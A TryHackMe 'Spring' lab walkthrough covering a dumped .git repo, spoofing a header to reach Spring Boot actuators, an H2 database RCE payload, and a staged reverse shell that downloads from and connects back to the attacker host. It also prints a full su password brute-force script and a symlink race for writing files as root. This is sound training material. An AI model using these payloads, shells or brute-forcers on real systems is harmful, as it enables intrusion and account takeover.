# 94 - Spring (GIT files analysis, SpringBoot RCE, su bruteforce, Modify service files to gain root)

Room Link --> [https://tryhackme.com/room/spring](https://tryhackme.com/room/spring)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT 22
80/tcp  open  http
443/tcp open  ssl/https
```
{% endcode %}

Added `spring.thm` to /etc/hosts. When navigating to it, we get automatically redirected to "https" .

#### FFUF enum

{% code overflow="wrap" %}
```bash
ffuf -u https://spring.thm/sources/new/FUZZ -w /usr/share/dirb/wordlists/common.txt -t 200

sources
```
{% endcode %}

We fuzzed again and got...

```bash
/sources/new/.git/HEAD
```

We see a `.git` repo here, we can run GitTools to dump the entire repo.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ /opt/GitTools/Dumper/gitdumper.sh https://spring.thm/sources/new/.git/ .

[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/1a/83ec34bf5ab3a89096346c46f6fda2d26da7e6
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/92/b433a86a015517f746a3437ba3802be9146722
[+] Downloaded: objects/39/858db3349ea85bfc5b0120dc5d2ca45f0683af
[+] Downloaded: objects/6b/d070178569781eb0534f575e52157aa59a501e
[+] Downloaded: objects/b4/63ef229486f86eeb72b89539bd3339e485807f
[+] Downloaded: objects/5d/eeca1fbb8b02b7a5fbf1776a9b6fc803afda32
[+] Downloaded: objects/8f/8904743c007a1542d0047be84912b7aa15279f
[+] Downloaded: objects/a9/f778a7a964b6f01c904ee667903f005d6df556
[+] Downloaded: objects/eb/f1ef86a29a04cc7ad00bdbc656056a6250e3f6
[+] Downloaded: objects/a4/c5e5165ecd93acf7f243da71430d4edcc2c780
[+] Downloaded: objects/06/e4e487ea33b438eddd5f01d01980e8eb483d54
[+] Downloaded: objects/93/407ced89dfa0d7e574bb117c6bbee7a0d40bc9
[+] Downloaded: objects/0c/304b129922b9739c4193b9a9b71b3050a0867d
[+] Downloaded: objects/0a/e5a6c68f4da02b8cb399eb0b90ead4272d7cd1
[+] Downloaded: objects/0f/4ff745b9480ab23ff47a25542e16094117c35a
[+] Downloaded: objects/d5/c72b751a3a756eb27f4f07664842d252dc4928
[+] Downloaded: objects/98/c8673dc8c0250e15f6a4c4ac7f90a7c8555dbb
[+] Downloaded: objects/69/871575a847bfef00491cd5912a59682b427525
[+] Downloaded: objects/bf/ee42398426f27ae8511e6f4e613207854fdb6d
[+] Downloaded: objects/6d/e5c4c83edbf094c885d02be5f275f589d452ac
[+] Downloaded: objects/6f/b8af92ee8f251b33184e01597255e87459ecb7
[+] Downloaded: objects/67/3abbf42bad7eff6574b6ea8759cea232cf63e7
[+] Downloaded: objects/f6/d1a5ff67503ff152c3be8db995939e22f20da6
[+] Downloaded: objects/71/e18111b0f82be167bcdf44501c40552d9e10ad
[+] Downloaded: objects/9a/8d7e300995dabbb2f0ab9a117f2ee02068aa8d
[+] Downloaded: objects/fc/719eba62e24fd379fd44dc35f1ab25f49ef231
[+] Downloaded: objects/5a/89f76e57f381e38efa3179fd69cf8ee7fd1e54
[+] Downloaded: objects/cc/f5992a16348d803da54a48aa64f24f81569380
[+] Downloaded: objects/66/058471882cd13e7e1229d7df0ecb1437b61e78
[+] Downloaded: objects/f0/f2f7760ac45cfeb34ced824b2abfbc6e436000
[+] Downloaded: objects/5e/a2aaeb59bb380f001a3a1569bb127d4834152a
[+] Downloaded: objects/fd/861389321333ed895fe9c22a79254db774a150
[+] Downloaded: objects/7b/8c746815c823dc9983dc27fc31e69dac3c7bf1
[+] Downloaded: objects/3d/b1ee8004fe3cad3b3637e018abdf443e328e3a
[+] Downloaded: objects/80/c24d20f6bb44e6e2d16aaf133f866a2182f597
[+] Downloaded: objects/e4/9a401d2e07d18bbd9bfc492d71c4467d16d2b3
[+] Downloaded: objects/29/e4f3b4e2234b489d695f8c262c1b4a1b6f6e9a
[+] Downloaded: objects/fe/e60fff5d20f703d74d02fa9a57ed364d9210ee
```
{% endcode %}

Now we can check the commits.

{% code overflow="wrap" %}
```bash
git log

commit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)
Author: John Smith <johnsmith@spring.thm>
Date:   Fri Jul 10 18:13:55 2020 +0000

    added greeting
    changed security password to my usual format

commit 92b433a86a015517f746a3437ba3802be9146722
Author: John Smith <johnsmith@spring.thm>
Date:   Sat Jul 4 23:53:25 2020 +0000

    Hello world
```
{% endcode %}

looks like there are only 2 commits. By just listing git log, we already know user name is `johnsmith` and there might be passwords in this repository so let's restore last commit and dig deeper.

When we run `git diff <commit hash 1> <commit hash 2>` we see a password.

{% code overflow="wrap" %}
```bash
git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6

spring.security.user.name=johnsmith
-spring.security.user.password=idontwannag0
+spring.security.user.password=PrettyS3cureSpringPassword123.
```
{% endcode %}

{% code overflow="wrap" %}
```bash
git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6

HEAD is now at 1a83ec3 added greeting changed security password to my usual format
```
{% endcode %}

Let's check the files we just restored

```
find . -ls |grep -v \\.git
```

```
1075425      4 drwxr-xr-x   5 root     root         4096 Jul 11 02:38 .
  1075426      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./gradle
  1075427      4 drwxr-xr-x   2 root     root         4096 Jul 11 02:11 ./gradle/wrapper
  1070970      4 -rw-r--r--   1 root     root          238 Jul 11 02:11 ./gradle/wrapper/gradle-wrapper.properties
  1070971      8 -rw-r--r--   1 root     root         5441 Jul 11 02:11 ./gradlew
  1075428      4 drwxr-xr-x   4 root     root         4096 Jul 11 02:11 ./src
  1075429      4 drwxr-xr-x   4 root     root         4096 Jul 11 02:11 ./src/main
  1075430      4 drwxr-xr-x   4 root     root         4096 Jul 11 02:11 ./src/main/java
  1075432      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/main/java/com
  1075433      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/main/java/com/onurshin
  1075434      4 drwxr-xr-x   2 root     root         4096 Jul 11 02:23 ./src/main/java/com/onurshin/spring
  1071386      8 -rw-r--r--   1 root     root         4350 Jul 11 02:11 ./src/main/java/com/onurshin/spring/Application.java
  1075431      4 drwxr-xr-x   2 root     root         4096 Jul 11 02:11 ./src/main/java/META-INF
  1071385      4 -rw-r--r--   1 root     root           70 Jul 11 02:11 ./src/main/java/META-INF/MANIFEST.MF
  1075435      4 drwxr-xr-x   2 root     root         4096 Jul 11 02:32 ./src/main/resources
  1071387      4 -rw-r--r--   1 root     root         1007 Jul 11 02:11 ./src/main/resources/application.properties
  1071388      4 -rw-r--r--   1 root     root         2581 Jul 11 02:11 ./src/main/resources/dummycert.p12
  1075436      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/test
  1075437      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/test/java
  1075438      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/test/java/com
  1075439      4 drwxr-xr-x   3 root     root         4096 Jul 11 02:11 ./src/test/java/com/onurshin
  1075440      4 drwxr-xr-x   2 root     root         4096 Jul 11 02:11 ./src/test/java/com/onurshin/spring
  1071389      4 -rw-r--r--   1 root     root          214 Jul 11 02:11 ./src/test/java/com/onurshin/spring/ApplicationTests.java
  1071383      4 -rw-r--r--   1 root     root         3058 Jul 11 02:11 ./gradlew.bat
  1071384      4 -rw-r--r--   1 root     root           28 Jul 11 02:11 ./settings.gradle
  1070969      4 -rw-r--r--   1 root     root         1151 Jul 11 02:11 ./build.gradle
```

Let's start with figuring out what application is this, by examining `build.gradle`;

```
plugins {
    id 'org.springframework.boot' version '2.3.1.RELEASE'
    id 'io.spring.dependency-management' version '1.0.9.RELEASE'
    id 'java'
}
```

we see that this is a Spring Boot 2.3.1 application and the version is [pretty recent](https://spring.io/blog/2020/06/12/spring-boot-2-3-1-available-now), still we will check for exploits but before that let's see what the application is about.

In `Application.java` file we see that there is a simple HelloWorld rest endpoint reqistered

```bash
cat ./src/main/java/com/onurshin/spring/Application.java

# outputs
        @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }
```

which is getting a `name` parameter and producing `Hello, {name}!` also printing the name to standard output of the process. Let's test this;

```bash
dking@dking ~/Downloads$ curl -k https://spring.thm/ -d "name=Dking"                                                  ✭master 
Hello, Dking!
```

Ok, let's move on, in the same Application.java there is a security configuration;

```
    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
```

from this we understand that there is a `/actuator/` endpoint that only allowed to be accessed from `172.16.0.0/24` network.

So what is an actuator, we also saw that same thing under dependencies in build.gradle

```
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-actuator'
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'

    implementation 'org.springframework.cloud:spring-cloud-starter-config'
    runtimeOnly 'com.h2database:h2'

    testImplementation('org.springframework.boot:spring-boot-starter-test') {
        exclude group: 'org.junit.vintage', module: 'junit-vintage-engine'
    }
    testImplementation 'org.springframework.security:spring-security-test'
}
```

A quick googling yields, actuators are a spring framework feature that [_"help you monitor and **manage** your application when you push it to production."_](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html) Sounds like it would be usefull if we can find a way to access it but accessing:

`https://<ip>/actuator/` gives us a `403 - Forbidden`.

Let's move on to the `application.properties`;

```
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
```

We have 2 possible passwords, maybe we can login to ssh as johnsmith using them;

```
ssh johnsmith@spring.thm
```

```
johnsmith@spring.thm: Permission denied (publickey).
```

Seems server only accepting logins with publickey. Let's focus more on `application.properties` especially this line;

```
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
```

A quick googling show, this this is replacing [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header name with `x-9ad42dea0356cb04`. So sending requests with `x-9ad42dea0356cb04` header we can change the IP address server thinks the request is coming from.

Let's try it;

{% code overflow="wrap" %}
```bash
curl -k https://spring.thm/actuator -H "x-9ad42dea0356cb04: 172.16.0.10" -v                  ✭master 
*   Trying 10.10.225.38:443...
* Connected to spring.thm (10.10.225.38) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  start date: Jul  4 15:33:44 2020 GMT
*  expire date: Apr 18 15:33:44 2294 GMT
*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
* using HTTP/1.x
> GET /actuator HTTP/1.1
> Host: spring.thm
> User-Agent: curl/8.3.0
> Accept: */*
> x-9ad42dea0356cb04: 172.16.0.10
> 
< HTTP/1.1 200 
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Strict-Transport-Security: max-age=31536000 ; includeSubDomains
< X-Frame-Options: DENY
< Content-Type: application/vnd.spring-boot.actuator.v3+json
< Transfer-Encoding: chunked
< Date: Fri, 24 Nov 2023 20:17:05 GMT
< 
* Connection #0 to host spring.thm left intact
{"_links":{"self":{"href":"https://spring.thm/actuator","templated":false},"beans":{"href":"https://spring.thm/actuator/beans","templated":false},"health-path":{"href":"https://spring.thm/actuator/health/{*path}","templated":true},"health":{"href":"https://spring.thm/actuator/health","templated":false},"shutdown":{"href":"https://spring.thm/actuator/shutdown","templated":false},"env-toMatch":{"href":"https://spring.thm/actuator/env/{toMatch}","templated":true},"env":{"href":"https://spring.thm/actuator/env","templated":false},"mappings":{"href":"https://spring.thm/actuator/mappings","templated":false},"restart":{"href":"https://spring.thm/actuator/restart","templated":false}}}%
```
{% endcode %}

And we got access to a bunch of actuators. This is a good time to start searching how can we exploit this.

### Exploiting Actuators

So let's google how to exploit what we have gained access to, `"spring boot" "actuator" "exploit"`; [first blog post we find](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) is showing 3 different methods to exploit actuators. Unfortunately none of those methods works for our application because;

1. There is no `/jolokia` endpoint
2. No `Eureka-Client` is in classpath
3. Even tho `Spring Cloud` is in the classpath, `SnakeYAML` is not.

So let's move on to the [next blog post](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database). Looks like all we need is `Spring-Cloud` and `h2` database on the classpath with `/env` and `/restart` actuators accessable, so we can use this. Let's try getting a ping from target;

#### Original Payload&#x20;

{% code overflow="wrap" %}
```
{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://x.burpcollaborator.net');"}
```
{% endcode %}

{% hint style="info" %}
Note: we have to escape the `'` quotes if not it won't work.

Then we use `--data-binary $''` to pass the payload.
{% endhint %}

{% code overflow="wrap" %}
```bash
curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping 10.18.88.214 -c 4\');"}' "https://spring.thm/actuator/env" -k

# then restart the server.
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://spring.thm/actuator/restart" -k
```
{% endcode %}

```bash
sudo tcpdump -i tun0 icmp
```

And we get a ping from the server.

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Ok, so we managed to execute code, time to spawn a reverse shell but before that there is one thing we need to know. Our code is using java's [`Runtime.exec()`](https://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#exec-java.lang.String-java.lang.String:A-java.io.File-) so we either stage our payload or use:

```
bash -c "<payload>"
```

### Initial Access

#### Stage 1 of Payload

Let's go with staging for simplicity; first we crate a script to create the reverse shell;

`reverse.sh`:

```
bash -c "bash -i >& /dev/tcp/<attackerip>/9000 0>&1"
```

and host it on localhost then send the first stage of the payload;

```
python3 -m http.server 80
```

{% code overflow="wrap" %}
```bash
#download reverse.sh using wget and put it in /tmp/rev.sh
curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://10.18.88.214/rev.sh -O /tmp/rev.sh\');"}' "https://spring.thm/actuator/env" -k

# restart server.
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://spring.thm/actuator/restart" -k

```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Stage 2 of Payload

Now we have `/tmp/rev.sh` is on the target, all we have to do is start a netcat listener on port 9000 and send requests to target to run `/tmp/rev.sh`;

```bash
nc -lvnp 9000
```

{% code overflow="wrap" %}
```bash
# run rev.sh using bash (remember rev.sh's executable bit is not set!)
curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/rev.sh\');"}' "https://spring.thm/actuator/env" -k

# restart the server.
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://spring.thm/actuator/restart" -k
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

And we get rev shell.

```bash
nobody@spring:/$ ls -al opt
ls -al opt
total 20
drwxr-xr-x  3 root root 4096 Jul 10  2020 .
drwxr-xr-x 24 root root 4096 Jul  3  2020 ..
-rw-r--r--  1 root root   34 Jul 10  2020 foothold.txt
-rw-r--r--  1 root root 2597 Jul  4  2020 privcert.p12
drwxr-xr-x  3 root root 4096 Jul 10  2020 spring
nobody@spring:/$ cd opt
cd opt
nobody@spring:/opt$ cat foothold.txt
cat foothold.txt
THM{dont_expose_.git_to_internet}
nobody@spring:/opt$ 
```

### Priv Esc to johnsmith

We get linpeas.sh to the target machine an run it and examine the output, at first glance, we see these interesting things;

```
[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/disk/by-uuid/034fd8d4-f332-4d6e-874f-53c492ad37ca  /       ext4    defaults        0 0
proc    /proc   proc    defaults,hidepid=2      0 0
```

proc is mounted with `hidepid=2` so we won't be able to see what everyone else is doing,

```
[+] Looking for root files in home dirs (limit 20)
/home
/home/johnsmith/tomcatlogs/1594410148.log
/home/johnsmith/tomcatlogs/1594481122.log               
/home/johnsmith/tomcatlogs/1594420877.log
/home/johnsmith/tomcatlogs/1594410465.log
```

root is creating log files under johnsmith owner directory, so if can get to be johnsmith, we might get arbitrary file write as root,

```
[+] Environment
[i] Any private information inside environment variables?
LANG=en_US.UTF-8
SUDO_GID=0
USERNAME=root
SUDO_COMMAND=/bin/su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -jar /opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-
store-password=PrettyS3cureKeystorePassword123.
XDG_SESSION_ID=c1
USER=nobody
HOME=/nonexistent
SUDO_USER=root
HISTFILE=/dev/null
SUDO_UID=0
```

Looks like our spring boot web server is started by `root` as `nobody` using `su` command we also see that there is a password specified for ssl key store; `PrettyS3cureKeystorePassword123.`

Let's move back a little and remember the git repository, we have found a very similar password there and commit was saying _"changed security password to my **usual format**"_

### Password format

So we have 2 passwords;

```
PrettyS3cureSpringPassword123.
PrettyS3cureKeystorePassword123.
```

it would be a fair assumption that this guy using a similar password for user account, so let's assume password format is;

```
PrettyS3cure[A-Z][a-z]+Password123.
```

Let's grep rockyou.txt for capitalized words;

```
cat rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
wc -l capitalized_words.txt
```

```
89652 capitalized_words.txt
```

### Bruteforcing `su`

Now we need to find a way to brute force johnsmith's password, problem is ssh is `publickey` only so we have to use `su`. We might use [sucrack](http://www.leidecker.info/projects/sucrack.shtml) but it is easy enough to script it so let's go with scripting;

First we need to find a way to pass the password to `su`, a little bit of googling takes us to [https://stackoverflow.com/a/38741462](https://stackoverflow.com/a/38741462) so running;

```bash
( sleep 0.2s && echo <password> ) | script -qc 'su johnsmith -c "id"' /dev/null)
```

produce `su: Authentication failure` if password is wrong.

So we write our `su_brute_force.sh`;

```bash
#!/bin/bash

set -m #enable job control
export TOP_PID=$$ #get the current PID
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT #exit on trap

# https://github.com/fearside/ProgressBar/blob/master/progressbar.sh
# something to look at while waiting
function progressbar {
        let _progress=(${1}*100/${2}*100)/100
        let _done=(${_progress}*4)/10
        let _left=40-$_done

        _done=$(printf "%${_done}s")
        _left=$(printf "%${_left}s")

        printf "\rCracking : [${_done// /#}${_left// /-}] ${_progress}%%"
}

function brute() {
        keyword=$1 #get the word
        password="PrettyS3cure${keyword}Password123." #add it to our format
        output=$( ( sleep 0.2s && echo $password ) | script -qc 'su johnsmith -c "id"' /dev/null) # check the password
        if [[ $output != *"Authentication failure"* ]]; then #if password was correct
                printf "\rCreds Found! johnsmith:$password\n$output\nbye..." #print the password
                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o '[0-9]*') #kill parent and other jobs
        fi
}

wordlist=$1 #get wordlist as parameter

count=$(wc -l $wordlist| grep -o '[0-9]*') #count how many words we have
current=1

while IFS= read -r line #for each line
do
        brute $line & #try the password
        progressbar ${current} ${count} #update progress bar. TODO:calculate ETA
        current=$(( current + 1 )) #increment
done < $wordlist #read the wordlist

wait #wait for active jobs
```

Now let's run this and see what happens;

```
time bash su_brute_force.sh capitalized_words.txt
```

```bash
nobody@spring:/tmp$ time bash brute.sh capitalized_words.txt 
Cracking : [----------------------------------------] 0%
Creds Found! johnsmith:PrettyS3cureAccountPassword123.7%
Password: 
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)
Cracking : [##--------------------------------------] 7%Killed

real	5m15.051s
user	1m59.520s
sys	0m29.737s
```

creds: `PrettyS3cureAccountPassword123.`&#x20;

### Let The Web Server Continue

Remember that we got here through a reverse shell. While our reverse shell is running, it is blocking the execution of the webserver and we will need webserver for doing the rest of the box. So let's create ssh keys, put our public key into `/home/johnsmith/.ssh/authorized_keys`, close our reverse shell and ssh into the box as johnsmith using our private key.

### Finding Arbitrary File Write As Root

By enumerating the service on the system we find a non-regular service;

```
cat /etc/systemd/system/spring.service
```

```
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
```

We try to read `/root/start_tomcat.sh` and end up with `Permission denied` but we can still see the status of the service, which might reveal what is in that `/root/start_tomcat.sh`, let's do;

```
systemctl status spring
```

```
● spring.service - Spring Boot Application
   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)
   Active: active (running) since Sun 2020-07-12 10:58:06 UTC; 30min ago
 Main PID: 846
    Tasks: 3 (limit: 1106)
   CGroup: /system.slice/spring.service
           ├─846 /bin/bash /root/start_tomcat.sh
           ├─861 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -jar /opt/spring/sources/new/spring-0.0.1-SNAPSHOT.jar --server.ssl.key-store=/opt/privcert.p12 --server.ssl.key-store-password=PrettyS3cureKeystorePassword123.
           └─862 tee /home/johnsmith/tomcatlogs/1594551486.log


```

Looks like script is running as root and using su as nobody to run our web application but **`tee` is still running as root**. Since we own the tomcatlogs folder, if we can predict the file name of the log file we can create a [`symlink`](https://linux.die.net/man/1/ln) to any file on the system and gain arbitrary file write as root.

`1594551486` looks like an [epoch time](https://en.wikipedia.org/wiki/Unix\_time), so predicting the file name is easy enough. Let's see if we can restart the service,

```
systemctl restart spring
```

```
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to restart 'spring.service'.
Authenticating as: root
Password: 
polkit-agent-helper-1: pam_authenticate failed: Authentication failure
==== AUTHENTICATION FAILED ===
Failed to restart spring.service: Access denied 
```

Looks like we are not allowed to restart the service, well we have access to restart endpoint we might try it but it only restarts the java application not the whole service so we need to find another way.

Let's look at the service definition again, this time closely;

```
[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh
```

We notice [`Restart=always`](https://www.freedesktop.org/software/systemd/man/systemd.service.html#Restart=) which means if service is stopped/crashed for any reason it will be restarted automatically. But how can we stop the application?

Let's remember the endpoints we gained access earlier;

```
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
```

so we can just use `shutdown` actuator to stop the application.

### Testing Arbitrary File Write

So let's list steps the better understand how this will work,

1. Send a request to `/actuator/shutdown`,
2. Create symlinks to target file in `/home/johnsmith/tomcatlogs/<epoch_time>.log`,
3. Application Stops,
4. Systemd kicks in and restarts the service,
5. If we created the symlink correctly, insted of creating a new file, `tee` follows our symlink and we get to write webserver output to anyfile we want as root.

Let's write a script for this;

```
target=$1

#send a shutdown request to the spring boot server
curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

#get date as epoch format
d=$(date '+%s')

#let's assume 30 seconds is enough to restart the service
for i in {1..30}
do
 #create symlinks to target file for 30 seconds
 let time=$(( d + i ))
 ln -s $target "$time.log"
done
```

put it under `/home/john/tomcatlogs/` and call it with a temp file to see if we get it right;

```
bash arbitrary_file_write.sh /tmp/arbitrary_file_write.test
```

```
{"message":"Shutting down, bye..."}
```

```
ls -la
```

```
total 228                                                                                                                                                                                                   
drwxrwxr-x 2 johnsmith johnsmith   4096 Jul 12 12:12 .                                                                                                                                                      
drwxr-xr-x 7 johnsmith johnsmith   4096 Jul 10 19:57 ..                                                                                                                                                     
-rw-r--r-- 1 root      root        6928 Jul 10 19:42 1594410148.log                                                                                                                                         
-rw-r--r-- 1 root      root        6728 Jul 10 19:47 1594410465.log                                                                                                                                         
-rw-r--r-- 1 root      root        6899 Jul 10 22:41 1594420877.log                                                                                                                                         
-rw-r--r-- 1 root      root      194285 Jul 12 12:12 1594551486.log                                                                                                                                         
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555964.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555965.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555966.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555967.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555968.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555969.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555970.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555971.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555972.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555973.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555974.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555975.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555976.log -> /tmp/arbitrary_file_write.test                                                                                                       
lrwxrwxrwx 1 johnsmith johnsmith     30 Jul 12 12:12 1594555977.log -> /tmp/arbitrary_file_write.test                                                                                                       
